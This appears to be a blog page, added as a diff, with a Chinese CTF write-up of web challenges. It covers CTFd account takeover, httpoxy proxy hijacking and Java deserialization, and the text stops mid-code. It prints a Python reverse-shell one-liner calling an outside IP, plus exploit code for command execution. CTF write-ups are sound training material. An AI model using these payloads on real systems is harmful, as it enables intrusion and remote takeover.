@@ -1,0 +1,665 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+  <meta charset="UTF-8">
+<meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=2">
+<meta name="theme-color" content="#222">
+<meta name="generator" content="Hexo 4.2.0">
+  <link rel="apple-touch-icon" sizes="180x180" href="/images/apple-touch-icon-next.png">
+  <link rel="icon" type="image/png" sizes="64x64" href="/images/favicon-48x48-next.png">
+  <link rel="icon" type="image/png" sizes="48x48" href="/images/favicon-48x48-next.png">
+  <link rel="mask-icon" href="/images/logo.svg" color="#222">
+
+<link rel="stylesheet" href="/css/main.css">
+
+
+<link rel="stylesheet" href="/lib/font-awesome/css/font-awesome.min.css">
+  <link rel="stylesheet" href="//cdn.jsdelivr.net/gh/fancyapps/fancybox@3/dist/jquery.fancybox.min.css">
+  <link rel="stylesheet" href="/lib/pace/pace-theme-minimal.min.css">
+  <script src="/lib/pace/pace.min.js"></script>
+
+<script id="hexo-configurations">
+    var NexT = window.NexT || {};
+    var CONFIG = {"hostname":"yoursite.com","root":"/","scheme":"Mist","version":"7.7.2","exturl":false,"sidebar":{"position":"left","display":"always","padding":18,"offset":12,"onmobile":false},"copycode":{"enable":true,"show_result":true,"style":"mac"},"back2top":{"enable":true,"sidebar":false,"scrollpercent":true},"bookmark":{"enable":false,"color":"#222","save":"auto"},"fancybox":true,"mediumzoom":false,"lazyload":false,"pangu":false,"comments":{"style":"tabs","active":null,"storage":true,"lazyload":false,"nav":null},"algolia":{"hits":{"per_page":10},"labels":{"input_placeholder":"Search for Posts","hits_empty":"We didn't find any results for the search: ${query}","hits_stats":"${hits} results found in ${time} ms"}},"localsearch":{"enable":true,"trigger":"auto","top_n_per_article":1,"unescape":false,"preload":false},"motion":{"enable":true,"async":false,"transition":{"post_block":"fadeIn","post_header":"slideDownIn","post_body":"slideDownIn","coll_header":"slideLeftIn","sidebar":"slideUpIn"}},"path":"search.xml"};
+  </script>
+
+  <meta name="description" content="V&amp;N招新赛部分web题解">
+<meta property="og:type" content="article">
+<meta property="og:title" content="V&amp;N招新赛web部分题解">
+<meta property="og:url" content="http://yoursite.com/2020/02/29/V/index.html">
+<meta property="og:site_name" content="BOITeam&#39;s Blog">
+<meta property="og:description" content="V&amp;N招新赛部分web题解">
+<meta property="og:locale" content="zh_CN">
+<meta property="og:image" content="http://yoursite.com/2020/02/29/V/image-20200229183951772.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/29/V/image-20200229184920698.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/29/V/image-20200229185248748.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/29/V/image-20200229185546941.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/29/V/image-20200229192230132.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/29/V/image-20200229193926226.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/29/V/image-20200229194145302.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/29/V/image-20200301110922154.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/29/V/image-20200301111336301.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/29/V/image-20200301112633247.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/29/V/image-20200301112812260.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/29/V/image-20200301113107762.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/29/V/image-20200301120719913.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/29/V/image-20200301120834520.png">
+<meta property="og:image" content="http://yoursite.com/2020/02/29/V/image-20200301122930606.png">
+<meta property="article:published_time" content="2020-02-29T10:33:07.000Z">
+<meta property="article:modified_time" content="2020-03-01T06:24:02.891Z">
+<meta property="article:author" content="BOITeam">
+<meta name="twitter:card" content="summary">
+<meta name="twitter:image" content="http://yoursite.com/2020/02/29/V/image-20200229183951772.png">
+
+<link rel="canonical" href="http://yoursite.com/2020/02/29/V/">
+
+
+<script id="page-configurations">
+  // https://hexo.io/docs/variables.html
+  CONFIG.page = {
+    sidebar: "",
+    isHome : false,
+    isPost : true
+  };
+</script>
+
+  <title>V&N招新赛web部分题解 | BOITeam's Blog</title>
+  
+
+
+
+
+
+
+  <noscript>
+  <style>
+  .use-motion .brand,
+  .use-motion .menu-item,
+  .sidebar-inner,
+  .use-motion .post-block,
+  .use-motion .pagination,
+  .use-motion .comments,
+  .use-motion .post-header,
+  .use-motion .post-body,
+  .use-motion .collection-header { opacity: initial; }
+
+  .use-motion .site-title,
+  .use-motion .site-subtitle {
+    opacity: initial;
+    top: initial;
+  }
+
+  .use-motion .logo-line-before i { left: initial; }
+  .use-motion .logo-line-after i { right: initial; }
+  </style>
+</noscript>
+
+<link rel="alternate" href="/atom.xml" title="BOITeam's Blog" type="application/atom+xml">
+</head>
+
+
+<body itemscope itemtype="http://schema.org/WebPage">
+  <div class="container use-motion">
+    <div class="headband"></div>
+
+    <header class="header" itemscope itemtype="http://schema.org/WPHeader">
+      <div class="header-inner"><div class="site-brand-container">
+  <div class="site-nav-toggle">
+    <div class="toggle" aria-label="切换导航栏">
+      <span class="toggle-line toggle-line-first"></span>
+      <span class="toggle-line toggle-line-middle"></span>
+      <span class="toggle-line toggle-line-last"></span>
+    </div>
+  </div>
+
+  <div class="site-meta">
+
+    <div>
+      <a href="/" class="brand" rel="start">
+        <span class="logo-line-before"><i></i></span>
+        <span class="site-title">BOITeam's Blog</span>
+        <span class="logo-line-after"><i></i></span>
+      </a>
+    </div>
+  </div>
+
+  <div class="site-nav-right">
+    <div class="toggle popup-trigger">
+        <i class="fa fa-search fa-fw fa-lg"></i>
+    </div>
+  </div>
+</div>
+
+
+<nav class="site-nav">
+  
+  <ul id="menu" class="menu">
+        <li class="menu-item menu-item-home">
+
+    <a href="/" rel="section"><i class="fa fa-fw fa-home"></i>首页</a>
+
+  </li>
+        <li class="menu-item menu-item-tags">
+
+    <a href="/tags/" rel="section"><i class="fa fa-fw fa-tags"></i>标签</a>
+
+  </li>
+        <li class="menu-item menu-item-categories">
+
+    <a href="/categories/" rel="section"><i class="fa fa-fw fa-th"></i>分类</a>
+
+  </li>
+        <li class="menu-item menu-item-archives">
+
+    <a href="/archives/" rel="section"><i class="fa fa-fw fa-archive"></i>归档</a>
+
+  </li>
+      <li class="menu-item menu-item-search">
+        <a role="button" class="popup-trigger"><i class="fa fa-search fa-fw"></i>搜索
+        </a>
+      </li>
+  </ul>
+
+</nav>
+  <div class="site-search">
+    <div class="popup search-popup">
+    <div class="search-header">
+  <span class="search-icon">
+    <i class="fa fa-search"></i>
+  </span>
+  <div class="search-input-container">
+    <input autocomplete="off" autocorrect="off" autocapitalize="off"
+           placeholder="搜索..." spellcheck="false"
+           type="search" class="search-input">
+  </div>
+  <span class="popup-btn-close">
+    <i class="fa fa-times-circle"></i>
+  </span>
+</div>
+<div id="search-result"></div>
+
+</div>
+<div class="search-pop-overlay"></div>
+
+  </div>
+</div>
+    </header>
+
+    
+  <div class="back-to-top">
+    <i class="fa fa-arrow-up"></i>
+    <span>0%</span>
+  </div>
+  <div class="reading-progress-bar"></div>
+
+
+    <main class="main">
+      <div class="main-inner">
+        <div class="content-wrap">
+          
+
+          <div class="content">
+            
+
+  <div class="posts-expand">
+      
+  
+  
+  <article itemscope itemtype="http://schema.org/Article" class="post-block " lang="zh-CN">
+    <link itemprop="mainEntityOfPage" href="http://yoursite.com/2020/02/29/V/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="image" content="/images/header.jpg">
+      <meta itemprop="name" content="BOITeam">
+      <meta itemprop="description" content="潜心专研、与世无争😄">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="BOITeam's Blog">
+    </span>
+      <header class="post-header">
+        <h1 class="post-title" itemprop="name headline">
+          V&N招新赛web部分题解
+        </h1>
+
+        <div class="post-meta">
+          
+            <span class="post-meta-item">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              <span class="post-meta-item-text">发表于</span>
+
+              <time title="创建时间：2020-02-29 18:33:07" itemprop="dateCreated datePublished" datetime="2020-02-29T18:33:07+08:00">2020-02-29</time>
+            </span>
+              <span class="post-meta-item">
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-calendar-check-o"></i>
+                </span>
+                <span class="post-meta-item-text">更新于</span>
+                <time title="修改时间：2020-03-01 14:24:02" itemprop="dateModified" datetime="2020-03-01T14:24:02+08:00">2020-03-01</time>
+              </span>
+
+          
+            <span class="post-meta-item" title="阅读次数" id="busuanzi_container_page_pv" style="display: none;">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-eye"></i>
+              </span>
+              <span class="post-meta-item-text">阅读次数：</span>
+              <span id="busuanzi_value_page_pv"></span>
+            </span><br>
+            <span class="post-meta-item" title="本文字数">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-file-word-o"></i>
+              </span>
+                <span class="post-meta-item-text">本文字数：</span>
+              <span>6.2k</span>
+            </span>
+            <span class="post-meta-item" title="阅读时长">
+              <span class="post-meta-item-icon">
+                <i class="fa fa-clock-o"></i>
+              </span>
+                <span class="post-meta-item-text">阅读时长 &asymp;</span>
+              <span>6 分钟</span>
+            </span>
+
+        </div>
+      </header>
+
+    
+    
+    
+    <div class="post-body" itemprop="articleBody">
+
+      
+        <p>V&amp;N招新赛部分web题解</p>
+<a id="more"></a>
+
+<h2 id="HappyCTFd"><a href="#HappyCTFd" class="headerlink" title="HappyCTFd"></a>HappyCTFd</h2><p>考点：ctfd漏洞</p>
+<p>参考链接<a href="https://www.colabug.com/2020/0204/6940556/" target="_blank" rel="noopener">https://www.colabug.com/2020/0204/6940556/</a>漏洞的相关分析，上文写的很详细，这里就不再介绍。</p>
+<p>解题步骤：</p>
+<ol>
+<li>先注册一个admin的账号，通过在admin前面加空格来绕过重复限制。</li>
+<li>生成忘记密码的链接。</li>
+<li>更改自己用户名为非admin.</li>
+<li>点击更改密码的链接，改后登录</li>
+</ol>
+<p><img src="/2020/02/29/V/image-20200229183951772.png" alt="image-20200229183951772"></p>
+<p>下载，后就得到flag.</p>
+<h2 id="CHECKIN"><a href="#CHECKIN" class="headerlink" title="CHECKIN"></a>CHECKIN</h2><p>考点：python反弹shell   proc目录</p>
+<p>访问就可以得到源码，右键源代码看到的代码自动有换行</p>
+<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request</span><br><span class="line"><span class="keyword">import</span> os</span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">flag_file = open(<span class="string">"flag.txt"</span>, <span class="string">"r"</span>)</span><br><span class="line"><span class="comment"># flag = flag_file.read()</span></span><br><span class="line"><span class="comment"># flag_file.close()</span></span><br><span class="line"><span class="comment">#</span></span><br><span class="line"><span class="comment"># @app.route('/flag')</span></span><br><span class="line"><span class="comment"># def flag():</span></span><br><span class="line"><span class="comment">#     return flag</span></span><br><span class="line"><span class="comment">## want flag? naive!</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># You will never find the thing you want:) I think</span></span><br><span class="line"><span class="meta">@app.route('/shell')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">shell</span><span class="params">()</span>:</span></span><br><span class="line">    os.system(<span class="string">"rm -f flag.txt"</span>)</span><br><span class="line">    exec_cmd = request.args.get(<span class="string">'c'</span>)</span><br><span class="line">    os.system(exec_cmd)</span><br><span class="line">    <span class="keyword">return</span> <span class="string">"1"</span></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route('/')</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">source</span><span class="params">()</span>:</span></span><br><span class="line">    <span class="keyword">return</span> open(<span class="string">"app.py"</span>,<span class="string">"r"</span>).read()</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">"__main__"</span>:</span><br><span class="line">    app.run(host=<span class="string">'0.0.0.0'</span>)</span><br></pre></td></tr></table></figure>
+
+<p>看到很简单的源码，有两个路由，</p>
+<ul>
+<li>/  ：可以得到app.py源码</li>
+<li>/shell  : 通过传入c变量可以执行命令，但是会删除flag.txt文件。</li>
+</ul>
+<p>开始时，想着通过类似时间盲注的方法去做题，后来一想python可以直接反弹shell,</p>
+<p>然后开了个linux-lab，反弹shell。</p>
+<figure class="highlight angelscript"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">c=python3%<span class="number">20</span>-c%<span class="number">20</span>%<span class="number">27</span><span class="keyword">import</span>%<span class="number">20</span>socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect((%<span class="number">22174.0</span><span class="number">.216</span><span class="number">.234</span>%<span class="number">22</span>,<span class="number">1234</span>));os.dup2(s.fileno(),<span class="number">0</span>);%<span class="number">20</span>os.dup2(s.fileno(),<span class="number">1</span>);%<span class="number">20</span>os.dup2(s.fileno(),<span class="number">2</span>);p=subprocess.call([%<span class="number">22</span>/bin/sh%<span class="number">22</span>,%<span class="number">22</span>-i%<span class="number">22</span>]);%<span class="number">27</span></span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/02/29/V/image-20200229184920698.png" alt="image-20200229184920698"></p>
+<p>之后就是找flag了，这里又学到了linux中/proc目录内容。更详细的可以<a href="https://blog.spoock.com/2019/10/08/proc/" target="_blank" rel="noopener">参考</a>这篇文章，总结的很详细。</p>
+<p><img src="/2020/02/29/V/image-20200229185248748.png" alt="image-20200229185248748"></p>
+<p>由于ps命令不可用，这里我们就去翻一下文件夹</p>
+<p><img src="/2020/02/29/V/image-20200229185546941.png" alt></p>
+<p>最后在/proc/10/fd文件里看见了flag</p>
+<h2 id="TimeTravel"><a href="#TimeTravel" class="headerlink" title="TimeTravel"></a>TimeTravel</h2><p>这题也给了源码</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">error_reporting(<span class="number">0</span>);</span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">'/vendor/autoload.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">GuzzleHttp</span>\<span class="title">Client</span>;</span><br><span class="line"></span><br><span class="line">highlight_file(<span class="keyword">__FILE__</span>);</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>])) &#123;</span><br><span class="line">    $client = <span class="keyword">new</span> Client();</span><br><span class="line">    $response = $client-&gt;get(<span class="string">'http://127.0.0.1:5000/api/eligible'</span>);</span><br><span class="line">    $content = $response-&gt;getBody();</span><br><span class="line">    $data = json_decode($content, <span class="keyword">TRUE</span>);</span><br><span class="line">    <span class="keyword">if</span>($data[<span class="string">'success'</span>] === <span class="keyword">true</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span> system(<span class="string">'/readflag'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'file'</span>])) &#123;</span><br><span class="line">    highlight_file($_GET[<span class="string">'file'</span>]);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'phpinfo'</span>])) &#123;</span><br><span class="line">    phpinfo();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>队友直接发了一个<strong>cve-2016-5385</strong>，然后去网上查一查，看到<a href="https://github.com/vulhub/vulhub/blob/master/cgi/httpoxy/www/index.php" target="_blank" rel="noopener">vulhub里面就有</a>看一下里里面的源码，</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">require</span> <span class="keyword">__DIR__</span> . <span class="string">'/vendor/autoload.php'</span>;</span><br><span class="line"></span><br><span class="line"><span class="keyword">use</span> <span class="title">GuzzleHttp</span>\<span class="title">Client</span>;</span><br><span class="line"></span><br><span class="line">header(<span class="string">'Content-Type: application/json; charset=utf-8'</span>);</span><br><span class="line"></span><br><span class="line">$client = <span class="keyword">new</span> Client([</span><br><span class="line">    <span class="comment">// Base URI is used with relative requests</span></span><br><span class="line">    <span class="string">'base_uri'</span> =&gt; <span class="string">'http://httpbin.org'</span>,</span><br><span class="line">    <span class="comment">// You can set any number of default request options.</span></span><br><span class="line">    <span class="string">'timeout'</span>  =&gt; <span class="number">2.0</span>,</span><br><span class="line">]);</span><br><span class="line"></span><br><span class="line">$response = $client-&gt;get(<span class="string">'http://httpbin.org/get'</span>);</span><br><span class="line"></span><br><span class="line">$body = $response-&gt;getBody();</span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> $body;</span><br></pre></td></tr></table></figure>
+
+<p>源码差不多</p>
+<blockquote>
+<p>简单来说，根据RFC 3875规定，cgi（fastcgi）要将用户传入的所有HTTP头都加上<code>HTTP_</code>前缀放入环境变量中，而恰好大多数类库约定俗成会提取环境变量中的<code>HTTP_PROXY</code>值作为HTTP代理地址。于是，恶意用户通过提交<code>Proxy: http://evil.com</code>这样的HTTP头，将使用缺陷类库的网站的代理设置为<code>http://evil.com</code>，进而窃取数据包中可能存在的敏感信息。</p>
+</blockquote>
+<p>这种漏洞的利用，通过在http请求头中添加Proxy头，就可以把请求代理到恶意的代理服务器，进而可以窃取数据报的敏感信息，也可以篡改请求报的响应。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span>(<span class="keyword">isset</span>($_GET[<span class="string">'flag'</span>])) &#123;</span><br><span class="line">    $client = <span class="keyword">new</span> Client();</span><br><span class="line">    $response = $client-&gt;get(<span class="string">'http://127.0.0.1:5000/api/eligible'</span>);</span><br><span class="line">    $content = $response-&gt;getBody();</span><br><span class="line">    $data = json_decode($content, <span class="keyword">TRUE</span>);</span><br><span class="line">    <span class="keyword">if</span>($data[<span class="string">'success'</span>] === <span class="keyword">true</span>) &#123;</span><br><span class="line">      <span class="keyword">echo</span> system(<span class="string">'/readflag'</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>从上面的关键代码可以看到，要得到flag,需要满足<code>$data[&#39;success&#39;] === true</code>，如果请求代理到我们的服务器，然后回向<a href="http://127.0.0.1:5000/api/eligible发送请求，如果发送的请求，json解码后，$data[&#39;success&#39;]为true,就会得到flag。" target="_blank" rel="noopener">http://127.0.0.1:5000/api/eligible发送请求，如果发送的请求，json解码后，$data[&#39;success&#39;]为true,就会得到flag。</a></p>
+<p>解题步骤</p>
+<ul>
+<li>用我们的apache服务器作为代理服务器</li>
+</ul>
+<p><img src="/2020/02/29/V/image-20200229192230132.png" alt="image-20200229192230132"></p>
+<ul>
+<li><p>然后用php在本地起一个服务器，监听5000端口，在api/eligible目录下新建index.php,脚本输出，解码后$data[‘success’]为true。</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//index.php</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">$a=<span class="keyword">array</span>(<span class="string">"success"</span>=&gt;<span class="keyword">true</span>);</span><br><span class="line"><span class="keyword">echo</span> json_encode($a);</span><br></pre></td></tr></table></figure>
+
+<p>本地在用php启一个php的内置服务器，端口为5000</p>
+<p><img src="/2020/02/29/V/image-20200229193926226.png" alt="image-20200229193926226"></p>
+</li>
+<li><p>然后burp再发包，触发条件，得到flag。</p>
+</li>
+</ul>
+<p><img src="/2020/02/29/V/image-20200229194145302.png" alt="image-20200229194145302"></p>
+<h2 id="EasySpringMVC"><a href="#EasySpringMVC" class="headerlink" title="EasySpringMVC"></a>EasySpringMVC</h2><p>考点：java反序列化</p>
+<p>题目给了源码是war包，用tomcat部署后，</p>
+<p><img src="/2020/02/29/V/image-20200301110922154.png" alt="image-20200301110922154"></p>
+<p>浏览一下功能，可以上传，但是要webmanage权限，开始以为要修改权限，上传个图片马 什么的。</p>
+<p>然后审计源码，由于之前没有做过java的题，对java的程序框架不是很了解，一边百度一边理解，<img src="/2020/02/29/V/image-20200301111336301.png" alt></p>
+<p>程序大致的框架就是这样（本人的理解），有控制器，有jsp文件，lib文件夹里面的都是引用的jar包，看了里面的jar包，没有反序列化漏洞的版本。这里的ClientinfoFilter就是一个全局过滤器，在web.xml文件中，</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">filter</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>clientinfo<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">filter-class</span>&gt;</span>com.filters.ClentInfoFilter<span class="tag">&lt;/<span class="name">filter-class</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">filter</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;<span class="name">filter-mapping</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">filter-name</span>&gt;</span>clientinfo<span class="tag">&lt;/<span class="name">filter-name</span>&gt;</span></span><br><span class="line">       <span class="tag">&lt;<span class="name">servlet-name</span>&gt;</span>*<span class="tag">&lt;/<span class="name">servlet-name</span>&gt;</span></span><br><span class="line">   <span class="tag">&lt;/<span class="name">filter-mapping</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<blockquote>
+<p>filter-class  必需元素，它指定过滤器实现类的完全限定名。</p>
+<p>filter-name  这个必需的元素必须与用filter元素声明时给予过滤器的名称相匹配。</p>
+<p>servlet-name  此元素给出一个名称，此名称必须与利用servlet元素给予servlet或JSP页面的名称相匹配。</p>
+</blockquote>
+<p><a href="http://www.51gjie.com/javaweb/868.html" target="_blank" rel="noopener">参考链接</a></p>
+<p><img src="/2020/02/29/V/image-20200301112633247.png" alt="image-20200301112633247"></p>
+<p>然后我们继续看ClientinfoFilter中的doFilter方法，</p>
+<p><img src="/2020/02/29/V/image-20200301112812260.png" alt="image-20200301112812260"></p>
+<p>首先去取cookie,如果cookie中有cinfo,exist就为true,然后进入判断，将cookie中的cinfo值base64解码，然后调用Tools.parse()方法，继续跟进</p>
+<p><img src="/2020/02/29/V/image-20200301113107762.png" alt="image-20200301113107762"></p>
+<p>parse方法对输入进行了反序列化，可以发现Tools类重写了readObject方法，<a href="http://www.lmxspace.com/2019/11/20/Java%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E8%BF%87%E7%A8%8B%E6%B7%B1%E7%A9%B6/" target="_blank" rel="noopener">那么参考大佬的文章</a>，重写反序列化方法会有风险，而且这里重写的方法还调用了ProcessBuilder().start)(),这个方法可以执行命令，到了这里，我们的思路就很清晰了，通过构造cookie,触发反序列化，调用重写的readObject方法，进而调用ProcessBuilder.start()方法，执行命令。</p>
+<p>首先，我们在本地尝试一下可不可以，</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//exp.java</span></span><br><span class="line"><span class="keyword">package</span> com.tools;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.util.Base64;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">exp</span></span>&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">void</span> <span class="title">main</span><span class="params">(String[] args)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">try</span> &#123;</span><br><span class="line">            Tools test = <span class="keyword">new</span> Tools();</span><br><span class="line">            <span class="keyword">byte</span>[] bytes = Tools.create(test);</span><br><span class="line">            Base64.Encoder  encoder = Base64.getEncoder();</span><br><span class="line">            System.out.println(encoder.encodeToString(bytes));</span><br><span class="line"></span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">catch</span>(Exception e)</span><br><span class="line">        &#123;</span><br><span class="line">            e.printStackTrace();</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>从上图我们可以看到create()方法中调用了writeObject，所以我们可以重写writeObject（）函数，来进一步利用</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">//Tools.java</span></span><br><span class="line"><span class="keyword">package</span> com.tools;</span><br><span class="line"></span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ByteArrayOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.IOException;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectInputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.ObjectOutputStream;</span><br><span class="line"><span class="keyword">import</span> java.io.Serializable;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="class"><span class="keyword">class</span> <span class="title">Tools</span> <span class="keyword">implements</span> <span class="title">Serializable</span> </span>&#123;</span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">long</span> serialVersionUID = <span class="number">1L</span>;</span><br><span class="line">    <span class="keyword">private</span> String testCall;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="title">Tools</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">static</span> Object <span class="title">parse</span><span class="params">(<span class="keyword">byte</span>[] bytes)</span> <span class="keyword">throws</span> Exception </span>&#123;</span><br><span class="line">        ObjectInputStream ois = <span class="keyword">new</span> ObjectInputStream(<span class="keyword">new</span> ByteArrayInputStream(bytes));</span><br><span class="line">        <span class="keyword">return</span> ois.readObject();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="keyword">static</span> <span class="keyword">byte</span>[] create(Object obj) <span class="keyword">throws</span> Exception &#123;</span><br><span class="line">        ByteArrayOutputStream bos = <span 